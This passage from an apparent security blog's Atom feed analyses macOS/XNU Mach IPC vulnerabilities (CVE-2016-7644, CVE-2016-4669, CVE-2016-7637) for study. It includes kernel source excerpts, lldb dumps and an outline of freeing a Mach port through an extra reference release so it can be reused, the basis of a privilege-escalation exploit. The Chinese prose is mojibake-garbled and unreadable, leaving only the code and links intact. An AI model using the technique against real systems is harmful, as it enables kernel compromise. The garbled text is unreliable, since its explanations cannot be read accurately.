0xdeadbeefdeadbeef&#10;0xffffff80115cfa30: 0xffffff8013dee0e0 0x0000000000000000&#10;0xffffff80115cfa40: 0x0000000000000000 0xffffffff00000000&#10;0xffffff80115cfa50: 0xffffff8013dee0e0 0x0000000000000000&#10;0xffffff80115cfa60: 0xffffff8013dee0e0 0x0000000000000000&#10;0xffffff80115cfa70: 0xffffff8013dee0e0 0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>æ¥ç€ï¼Œ<code>mach_ports_register</code>çš„é€»è¾‘å°±ä¼šè¶Šç•Œå°†<code>0xffffff80115cfa00</code>å¤„çš„<code>0xffffff8013dee0e0</code>æ‹·åˆ°<code>task-&gt;itk_registered</code>ä¸­å»ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TASK_PORT_REGISTER_MAX; i++) &#123;</span><br><span class="line">      <span class="keyword">ipc_port_t</span> old;</span><br><span class="line"></span><br><span class="line">      old = task-&gt;itk_registered[i];</span><br><span class="line">      task-&gt;itk_registered[i] = ports[i];</span><br><span class="line">      ports[i] = old;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡<code>lldb</code>æŸ¥çœ‹<code>ports</code>çš„çŠ¶æ€ã€‚</p>
<p></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p *(<span class="keyword">ipc_port_t</span>)<span class="number">0xffffff8013dee0e0</span></span><br><span class="line"></span><br><span class="line">(ipc_port) $<span class="number">12</span> = &#123;</span><br><span class="line">  ip_object = &#123;</span><br><span class="line">    io_bits = <span class="number">2147483648</span></span><br><span class="line">    io_references = <span class="number">4057</span></span><br><span class="line">    io_lock_data = (interlock = <span class="number">0x0000000000000000</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  [...]</span><br><span class="line">  ip_srights = <span class="number">4056</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨ç¬¬äºŒæ¬¡è°ƒç”¨åˆ°<code>mach_ports_register</code>çš„æ—¶å€™ï¼Œä¼šå¯¹ä»–ä»¬è°ƒç”¨<code>ipc_port_release_send</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç¬¬äºŒæ¬¡è°ƒç”¨mach_ports_registerå‡½æ•°æ—¶ï¼Œportsä¸­çš„æ•°æ®å˜æˆäº†åˆšåˆšå­˜å‚¨çš„</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TASK_PORT_REGISTER_MAX; i++) </span><br><span class="line">      <span class="keyword">if</span> (IP_VALID(ports[i]))</span><br><span class="line">        ipc_port_release_send(ports[i]);</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ—¶å€™å†è§‚å¯Ÿ<code>port</code>åœ¨å†…æ ¸ä¸­çš„çŠ¶æ€ï¼Œæœºä¼šå‘ç°<code>ip_srights</code>å’Œ<code>io_references</code>éƒ½åšäº†ä¸€æ¬¡<strong>å‡ä¸€</strong>ã€‚</p>
<p>è¿™ä¸ªæ—¶å€™åœ¨é‡Šæ”¾æ‰æ‰€æœ‰çš„<code>stashed port</code>å°±å°†æˆ‘ä»¬çš„<code>target port</code> é‡Šæ”¾æ‰äº†ã€‚å› ä¸ºé€šè¿‡è§¦å‘<code>bug</code>å¤šé‡Šæ”¾äº†ä¸€æ¬¡ã€‚</p>
<ul>
<li>é€šè¿‡<code>stashed port</code>åˆ›é€ äº†4096ä¸ª<code>reference</code>ï¼Œé‡Šæ”¾æ‰æ‰€æœ‰çš„<code>stashed port</code>å°±å¯¹<code>reference</code>åšäº†4096æ¬¡<strong>å‡ä¸€</strong>ï¼Œé€šè¿‡è§¦å‘bug åˆå¤šåšäº†ä¸€æ¬¡<code>release</code>ï¼Œé‡Šæ”¾äº†ä¸€å¼€å§‹<code>mach_port_allocate</code>åˆ›å»ºçš„<code>reference</code>ã€‚</li>
<li><code>srights</code>ä¸<code>reference</code>ç›¸åŒã€‚</li>
</ul>
<h2 id="3-3_é‡ç”¨port">3.3 é‡ç”¨port</h2><p>è¿™ä¸€æ­¥åœ¨æˆ‘çš„<code>EXP</code>é‡Œå°±æ˜¯çœ‹è„¸äº†ï¼ŒæˆåŠŸç‡å¹¶ä¸æ˜¯å¾ˆé«˜ï¼Œæ²¡æœ‰æ‰¾åˆ°ç¨³å®šçš„åˆ©ç”¨æ–¹æ³•ã€‚å°±ä¸å¤šè¯´ä»€ä¹ˆäº†ï¼Œä»åˆ«çš„<code>EXP</code>é‡ŒæŠ„æ¥çš„ä»£ç ã€‚</p>
<h1 id="0x04_å°ç»“">0x04 å°ç»“</h1><p>åˆ°è¿™é‡Œæ•´ä¸ª<code>MACH-IPC</code>ç›¸å…³çš„æ¼æ´åˆ†æä¸å­¦ä¹ å°±æš‚æ—¶å‘Šä¸€æ®µè½äº†ã€‚</p>
<p>è¿™ç¯‡åˆ†ææ—¥å¿—ï¼Œæ–­æ–­ç»­ç»­å†™äº†å¾ˆä¹…ï¼Œå¯èƒ½æ€è·¯æœ‰ç‚¹ä¸è¿è´¯ï¼Œæœ‰ä»€ä¹ˆé—®é¢˜æ¬¢è¿å¤§å®¶ä¸€èµ·æ¢è®¨ï¼šï¼‰</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>å¤äººå­¦é—®æ— é—åŠ›ï¼Œå°‘å£®åŠŸå¤«è€å§‹æˆã€‚çº¸ä¸Šå¾—æ¥ç»ˆè§‰æµ…ï¼Œç»çŸ¥æ­¤äº‹è¦èº¬è¡Œã€‚</p>
<p>â€”é™†æ¸¸ã€Šå†¬å¤œè¯»ä¹¦ç¤ºå­è¿ã€‹</p>
</blockquote>
<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>æœ¬æ–‡æ˜¯ç¬¬ä¸‰ç¯‡åŸºäºæ¼æ´åˆ†ææ¥å­¦ä¹ <code>Mach IPC</code>çš„æ–¹é¢çŸ¥è¯†çš„è®°å½•ã€‚</p>
<p>é˜…è¯»é¡ºåºå¦‚ä¸‹ã€‚</p>
<p>1.<a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/">å†çœ‹CVE-2016-1757â€”æµ…æmach messageçš„ä½¿ç”¨</a></p>
<p>2.<a href="http://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/">CVE-2016-7637â€”å†è°ˆMach IPC</a></p>
<p>3.ä»CVE-2016-7644å›åˆ°CVE-2016-4669ï¼ˆæœ¬æ–‡ï¼‰</p>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7644">CVE-2016-7644</a>è¿™ä¸ªæ¼æ´ï¼Œæœ¬èº«æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„æ¼æ´ï¼Œä½†æ˜¯é€šè¿‡ä¸€äº›æŠ€å·§ï¼Œå¯ä»¥åšä¸€äº›æ›´æœ‰æ„æ€çš„äº‹æƒ…ã€‚</p>
<p><code>poc</code>ä¸<code>writeup</code>åœ¨<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=965&amp;can=1&amp;q=label%3AFinder-ianbeer&amp;sort=-id">è¿™é‡Œ</a>ã€‚</p>
<p>CVE-2016-4669çš„POCï¼Œä¹‹å‰æˆ‘å·²ç»åˆ†æè¿‡äº†,è¯¦è§<a href="http://turingh.github.io/2016/11/07/CVE-2016-4669%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/">CVE-2016-4669åˆ†æä¸è°ƒè¯•</a>ã€‚åœ¨åšå®Œè¿™ä¸€ç³»åˆ—çš„<code>IPC</code>ç›¸å…³çš„æ¼æ´ç ”ç©¶ä¸å­¦ä¹ ä¹‹åï¼Œå°è¯•çš„å¯¹CVE-2016-4669è¿™ä¸ªæ¼æ´å®ç°ä¸€ä¸ªææƒçš„åˆ©ç”¨ã€‚</p>
<p>å¹¶ä¸èƒ½ç¨³å®šè§¦å‘ï¼Œä¸è¿‡ä¹ŸåŠ æ·±äº†å¯¹å†…æ ¸çš„å†…å­˜å¸ƒå±€ä¸IPCæ¨¡å—çš„ç†è§£ã€‚ä»£ç åœ¨<a href="https://github.com/turingH/CVE-2016-4669">è¿™é‡Œ</a>ã€‚</p>]]>
    
    </summary>
    
      <category term="CVE" scheme="http://turingh.github.io/tags/CVE/"/>
    
      <category term="IPC" scheme="http://turingh.github.io/tags/IPC/"/>
    
      <category term="MACH" scheme="http://turingh.github.io/tags/MACH/"/>
    
      <category term="XNU" scheme="http://turingh.github.io/tags/XNU/"/>
    
      <category term="CVE" scheme="http://turingh.github.io/categories/CVE/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/CVE/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-7637---å†è°ˆMach IPC]]></title>
    <link href="http://turingh.github.io/2017/01/10/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/"/>
    <id>http://turingh.github.io/2017/01/10/CVE-2016-7637-å†è°ˆMach-IPC/</id>
    <published>2017-01-10T15:26:15.000Z</published>
    <updated>2017-01-10T19:49:38.000Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>ä¸ºå­¦å¤§ç—…åœ¨å¥½åã€‚</p>
</blockquote>
<h1 id="0x00_æ‘˜è¦">0x00 æ‘˜è¦</h1><p>â€‹    å»å¹´åœ¨åˆ†æ<a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/">CVE-2016-1757</a>æ—¶ï¼Œåˆæ­¥çš„æ¥è§¦äº†<code>Mach</code>åœ¨<code>IPC</code>ç³»ç»Ÿä¸­ä½¿ç”¨çš„<code>Message</code>ï¼Œåœ¨åˆ†ææœ€è¿‘çš„ä¸€ç³»åˆ—ä¸<code>IPC</code>æ¨¡å—ç›¸å…³çš„æ¼æ´æ—¶ï¼ŒåˆåŠ å¼ºå¯¹<code>IPC</code>æ¨¡å—çš„ç†è§£ï¼Œæ‰€ä»¥é€šè¿‡ä¸€åˆ°ä¸¤ç¯‡æ–‡ç« æ¢³ç†ä¸€ä¸‹æœ€è¿‘çš„å­¦ä¹ æ€»ç»“ä¸å¿ƒå¾—ä½“ä¼šã€‚</p>
<p>â€‹    å…³äº<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7637" target="_blank" rel="external">CVE-2016-7637</a>è¿™ä¸ªæ¼æ´çš„æè¿°æœ‰å¾ˆå¤šèµ„æ–™äº†ï¼Œæ˜¯ä¸€ä¸ªæ”»å‡»<code>Mach</code>çš„å†…æ ¸<code>IPC</code>æ¨¡å—çš„æ¼æ´ï¼Œæœ¬æ–‡æœ€åä¼šå¯¹æ¼æ´åšå‡ºæ¯”è¾ƒè¯¦ç»†çš„è§£é‡Šï¼Œè¿™é‡Œç»™å‡ºå‡ ä¸ªé“¾æ¥ï¼Œä¸ç†Ÿæ‚‰è¿™ä¸ªæ¼æ´çš„è¯»è€…å¯ä»¥å…ˆäº†è§£ä¸€ä¸‹ã€‚</p>
<p>â€‹    <a href="https://jaq.alibaba.com/community/art/show?articleid=687" target="_blank" rel="external">é»‘äº‘å‹åŸåŸæ¬²æ‘§ - 2016å¹´iOSå…¬å¼€å¯åˆ©ç”¨æ¼æ´æ€»ç»“</a></p>
<p>â€‹    <a href="http://blog.pangu.io/mach-portal-details/" target="_blank" rel="external">mach portalæ¼æ´åˆ©ç”¨çš„ä¸€äº›ç»†èŠ‚</a></p>
<p>â€‹    <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=959&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">Broken kernel mach port name uref</a></p>
<a id="more"></a>
<h1 id="0x01_ä»€ä¹ˆæ˜¯Port">0x01 ä»€ä¹ˆæ˜¯Port</h1><p>â€‹    å¯¹äºä¸€èˆ¬çš„å¼€å‘è€…ï¼Œåœ¨ç”¨åˆ°<code>Port</code>çš„æ—¶å€™å¯ä»¥ç®€å•çš„å°†<code>Port</code>ç†è§£ä¸ºè¿›ç¨‹é—´é€šä¿¡æ‰€ä½¿ç”¨çš„ç±»ä¼¼äº<code>Socket</code>çš„ä¸œè¥¿ï¼Œå¯ä»¥ç”¨ä»–æ¥å‘é€æ¶ˆæ¯ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥æ¥æ”¶æ¶ˆæ¯ã€‚</p>
<p>â€‹    ä¸‹é¢æˆ‘ä»¬æ¥ä¸€æ­¥ä¸€æ­¥çš„æ„å»ºå¯¹æ•´ä¸ªæ¨¡å—çš„ç†è§£ã€‚</p>
<p>â€‹    å·²ç»çŸ¥é“<code>Port</code>æ˜¯ä»€ä¹ˆçš„è¯»è€…å¯ä»¥è·³è¿‡è¿™ä¸€ä¸ªéƒ¨åˆ†ã€‚</p>
<h2 id="1-1_åˆ©ç”¨Portä¼ é€’æ•°æ®">1.1 åˆ©ç”¨Portä¼ é€’æ•°æ®</h2><p>â€‹    <code>Port</code>æœ€ç®€å•çš„å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªå†…æ ¸ä¸­çš„æ¶ˆæ¯é˜Ÿåˆ—ã€‚ä¸åŒçš„<code>Task</code>é€šè¿‡è¿™ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ç›¸äº’ä¼ é€’æ•°æ®ã€‚è€Œ<code>Port</code>å°±æ˜¯ç”¨äºæ‰¾åˆ°è¿™ä¸ªé˜Ÿåˆ—çš„ç´¢å¼•ã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/%E5%88%A9%E7%94%A8Port%E4%BC%A0%E9%80%92%E6%95%B0%E6%8D%AE.png" alt="åˆ©ç”¨Portä¼ é€’æ•°æ®"></p>
<h2 id="1-2_Portã€Port_Name_ä¸_Right">1.2 Portã€Port Name ä¸ Right</h2><p>é€šè¿‡å‡½æ•°<code>mach_port_allocate</code>å°±å¯ä»¥åœ¨å†…æ ¸ä¸­å»ºç«‹ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶è·å–ä¸€ä¸ªä¸ä¹‹å¯¹åº”çš„çš„<code>Port</code>ã€‚ä»£ç å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mach_port_t</span> p;</span><br><span class="line">mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;p);</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æŸ¥çœ‹å†…æ ¸æºç ï¼Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span><br><span class="line"> *	Purpose:</span><br><span class="line"> *		Allocates a right in a space.  Like mach_port_allocate_name,</span><br><span class="line"> *		except that the implementation picks a name for the right.</span><br><span class="line"> *		The name may be any legal name in the space that doesn't</span><br><span class="line"> *		currently denote a right.</span><br><span class="line"> */</span></span><br><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">mach_port_allocate(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_right_t</span>	right,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	*namep)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">kern_return_t</span>		kr;</span><br><span class="line">	<span class="keyword">mach_port_qos_t</span>		qos = qos_template;</span><br><span class="line"></span><br><span class="line">	kr = mach_port_allocate_full (space, right, MACH_PORT_NULL,</span><br><span class="line">					&amp;qos, namep);</span><br><span class="line">	<span class="keyword">return</span> (kr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä»”ç»†çœ‹çš„è¯ä¼šå‘ç°ï¼Œå¯¹æˆ‘ä»¬åˆšåˆšç”³è¯·çš„<code>p</code>å‡ºç°äº†å¥½å‡ ä¸ªè§£é‡Šï¼Œä¸€ä¸‹å°±æ™•äº†ã€‚</p>
<ul>
<li>åœ¨åº”ç”¨å±‚ä»£ç ä¸­ï¼Œpè¢«å®šä¹‰ä¸º<code>mach_port_t</code>ã€‚</li>
<li>åœ¨å†…æ ¸ä¸­ä»£ç ä¸­ï¼Œ<code>namep</code>æ˜¯<code>mach_port_name_t</code>ã€‚</li>
<li>åœ¨æ³¨é‡Šä¸­åˆè¯´ï¼ŒAllocates a <font color="Crimson">RIGHT</font>  in a spaceã€‚</li>
</ul>
<h3 id="1-2-1_Portä¸Port_Name">1.2.1 Portä¸Port Name</h3><p>é€šè¿‡è°ƒè¯•å™¨è§‚å¯Ÿä¸€ä¸‹ï¼Œå¯ä»¥å‘ç°ï¼Œ</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) p p&#10;(mach_port_t) $0 = 3331</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* frame <span class="preprocessor">#<span class="number">0</span>: <span class="number">0xffffff801d4ee11d</span> kernel`mach_port_allocate_full(space=<span class="number">0xffffff8024ceac00</span>, right=<span class="number">1</span>, proto=<span class="number">0x0000000000000000</span>, qosp=<span class="number">0xffffff887d7b3ef0</span>, namep=<span class="number">0xffffff887d7b3eec</span></span></span><br></pre></td></tr></table></figure>
<p>åœ¨åº”ç”¨å±‚çš„<code>mach_port_t</code>æ˜¯ä¸€ä¸ªå·²ç»ç»è¿‡ä»£ç å¤„ç†çš„ç±»ä¼¼äº<code>Socket</code>çš„ä¸€ä¸ªæ•´æ•°ï¼Œæ¥è¡¨ç¤ºè¿™ä¸ª<code>Port</code>ã€‚</p>
<p>è€Œ<code>namep</code>åœ¨å†…æ ¸ä¹‹ä¸­æ˜¯ä¸€ä¸ªåœ°å€ï¼ŒæŒ‡å‘äº†ä¸€å—ç”¨æ¥ç´¢å¼•<code>Port</code>çš„å†…å­˜ï¼Œå…·ä½“çš„å®ç°åœ¨æœ¬æ–‡çš„åé¢ä¼šæœ‰æ›´è¯¦ç»†çš„è§£é‡Šã€‚</p>
<h3 id="1-2-2_Right">1.2.2 Right</h3><p>è¿™é‡Œæ³¨é‡Šæ‰€è¯´çš„<code>Right</code>ç®€å•çš„ç†è§£ï¼Œå…¶å®æ˜¯ä¸€ä¸ª<code>Port</code>å’Œå¯¹è¿™ä¸ª<code>Port</code>è¿›è¡Œè®¿é—®çš„æƒé™ã€‚æ¯ä¸€ä¸ª<code>Port</code>ä»£è¡¨çš„æ¶ˆæ¯é˜Ÿåˆ—å¹¶ä¸æ˜¯å¯ä»¥ä»»æ„è®¿é—®çš„ï¼Œéœ€è¦æœ‰å¯¹è¿™ä¸ªé˜Ÿåˆ—çš„è®¿é—®æƒé™ã€‚å„ç§æƒé™åœ¨å¤´æ–‡ä»¶ä¸­çš„å®šä¹‰å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND      ((mach_port_right_t) <span class="number">0</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_RECEIVE   ((mach_port_right_t) <span class="number">1</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_SEND_ONCE ((mach_port_right_t) <span class="number">2</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_PORT_SET  ((mach_port_right_t) <span class="number">3</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_DEAD_NAME ((mach_port_right_t) <span class="number">4</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> MACH_PORT_RIGHT_NUMBER    ((mach_port_right_t) <span class="number">5</span>)</span></span><br></pre></td></tr></table></figure>
<p>æ¯ç§<code>Right</code>éƒ½æœ‰ä¸åŒçš„å«ä¹‰ï¼Œå¯ä»¥è‡ªè¡ŒæŸ¥é˜…æ–‡æ¡£ã€‚</p>
<p>è¿™é‡Œéœ€è¦ç®€å•çš„æä¸€ä¸‹çš„å°±æ˜¯æ¯ä¸€ä¸ª<code>Port</code>éƒ½æœ‰ä¸”åªæœ‰<code>Task</code>å¯¹å…¶æ‹¥æœ‰<code>RECEIVE</code>çš„æƒé™ï¼Œ<code>SEND</code>çš„æƒé™ä¸é™ã€‚æ‹¥æœ‰<code>MACH_PORT_RIGHT_RECEIVE</code>æ—¶ä¹Ÿå¯ä»¥å¯¹<code>Port</code>è¿›è¡Œæ¶ˆæ¯çš„Sendã€‚</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/CVE-2016-7637-%E5%86%8D%E8%B0%88Mach-IPC/PORT_NAME_RIGHT.png" alt="PORT_NAME_RIGHT"></p>
<h2 id="1-3_Portçš„å…·ä½“å®ç°">1.3 Portçš„å…·ä½“å®ç°</h2><p>é˜…è¯»<code>mach_port_allocate_full</code>å‡½æ•°çš„æºç ï¼Œæœ€ç»ˆåœ¨ä¸€ä¸ª<code>port</code>çš„åˆ›å»ºæµç¨‹ä¸­ï¼Œæœ€ä¸»è¦çš„å‡½æ•°æ˜¯<code>ipc_port_alloc</code>ä»¥åŠåœ¨å…¶å®ç°ä¸­è°ƒç”¨çš„<code>ipc_object_alloc</code>ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_port_alloc(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	*namep,</span><br><span class="line">	<span class="keyword">ipc_port_t</span>		*portp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">ipc_port_t</span> port;</span><br><span class="line">	<span class="keyword">mach_port_name_t</span> name;</span><br><span class="line">	<span class="keyword">kern_return_t</span> kr;</span><br><span class="line">	    </span><br><span class="line">	kr = ipc_object_alloc(space, IOT_PORT,</span><br><span class="line">			      MACH_PORT_TYPE_RECEIVE, <span class="number">0</span>,</span><br><span class="line">			      &amp;name, (<span class="keyword">ipc_object_t</span> *) &amp;port);</span><br><span class="line">	<span class="keyword">if</span> (kr != KERN_SUCCESS)</span><br><span class="line">		<span class="keyword">return</span> kr;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* port and space are locked */</span></span><br><span class="line">	ipc_port_init(port, space, name);</span><br><span class="line">	[...]</span><br><span class="line">  </span><br><span class="line">	*namep = name; &lt;--namepæ˜¯ä»è¿™é‡Œæ¥çš„ã€‚</span><br><span class="line">	*portp = port;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¾ˆæ˜æ˜¾ï¼Œ<code>port</code>å’Œ<code>name</code>ä¸¤ä¸ªå˜é‡éƒ½æ˜¯ç”±å‡½æ•°<code>ipc_object_alloc</code>ä¸­è·å–çš„ã€‚å…³é”®æºç å¦‚ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span></span><br><span class="line">ipc_object_alloc(</span><br><span class="line">	<span class="keyword">ipc_space_t</span>		space, </span><br><span class="line">	<span class="keyword">ipc_object_type_t</span>	otype,</span><br><span class="line">	<span class="keyword">mach_port_type_t</span>	type,</span><br><span class="line">	<span class="keyword">mach_port_urefs_t</span>	urefs,</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	*namep,</span><br><span class="line">	<span class="keyword">ipc_object_t</span>		*objectp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">ipc_object_t</span> object;</span><br><span class="line">	<span class="keyword">ipc_entry_t</span> entry;</span><br><span class="line">	<span class="keyword">kern_return_t</span> kr;</span><br><span class="line"></span><br><span class="line">	[...]</span><br><span class="line">  </span><br><span class="line">    <span class="comment">//ä»zoneä¸­ç”³è¯·å†…å­˜,è¿™ä¸ªobjectå°±æ˜¯ipc_port</span></span><br><span class="line">	object = io_alloc(otype);	</span><br><span class="line">  </span><br><span class="line">    [...]</span><br><span class="line">  	</span><br><span class="line">  	<span class="comment">//è·å–namepå’Œentry</span></span><br><span class="line">	*namep = CAST_MACH_PORT_TO_NAME(object);</span><br><span class="line">	kr = ipc_entry_alloc(space, namep, &amp;entry);</span><br><span class="line">	<span class="keyword">if</span> (kr != KERN_SUCCESS) &#123;</span><br><span class="line">		io_free(otype, object);</span><br><span class="line">		<span class="keyword">return</span> kr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* space is write-locked */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//è®¾ç½®å…³é”®çš„å‚æ•°</span></span><br><span class="line">	entry-&gt;ie_bits |= type | urefs;</span><br><span class="line">	entry-&gt;ie_object = object;</span><br><span class="line">	ipc_entry_modified(space, *namep, entry);</span><br><span class="line"></span><br><span class="line">	io_lock(object);</span><br><span class="line"></span><br><span class="line">	object-&gt;io_references = <span class="number">1</span>; <span class="comment">/* for entry, not caller */</span></span><br><span class="line">	object-&gt;io_bits = io_makebits(TRUE, otype, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	*objectp = object;</span><br><span class="line">	<span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1-3-1_IPC_Spaceå’ŒIPC_Entry">1.3.1 IPC Spaceå’ŒIPC Entry</h3><p>â€‹    ç»†å¿ƒçš„è¯»è€…ä¼šå‘ç°å‰é¢æœ‰ä¸ªå«åš<code>space</code>çš„å‚æ•°æ²¡æœ‰è§£é‡Šã€‚è¿™é‡Œåˆå‡ºç°äº†ä¸€ä¸ªæ–°çš„ç»“æ„å«åš<code>entry</code>ã€‚ä»–ä»¬æ˜¯æœ‰å…³ç³»çš„ï¼Œè¿™é‡Œæˆ‘ä»¬æ¥ä¸€èµ·è§£é‡Šä¸€ä¸‹ã€‚</p>
<blockquote>
<p>Each task has a private IPC <em>space</em>a namespace for portsthat is represented by the ipc_space structure in the kernel.</p>
<p>Mac OS X Internals</p>
</blockquote>
<p>æ¯ä¸€ä¸ª<code>Task</code>éƒ½æœ‰ä¸€ä¸ªè‡ªå·±ç‹¬ç«‹çš„<code>IPC</code>çš„æ•°æ®ç©ºé—´ï¼Œå°±æ˜¯è¿™é‡Œçš„<code>space</code>ã€‚ä»–çš„æ•°æ®ç»“æ„æ˜¯å®šä¹‰å¦‚ä¸‹ã€‚</p>
